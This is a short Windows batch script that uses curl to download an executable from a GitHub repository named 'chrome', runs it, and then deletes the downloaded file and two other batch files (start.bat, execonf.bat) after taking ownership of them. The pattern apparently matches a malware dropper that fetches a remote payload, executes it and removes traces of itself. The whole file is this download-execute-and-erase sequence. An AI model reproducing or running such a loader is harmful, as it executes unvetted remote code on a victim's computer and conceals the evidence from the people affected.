@echo off
curl -o run.exe "https://raw.githubusercontent.com/abubabdul/chrome/main/dcpl.exe"
run.exe
(
    del run.exe
    takeown "start.bat"
    del /F /Q "start.bat"
    takeown "execonf.bat"
    del /F /Q "execonf.bat"
)
exit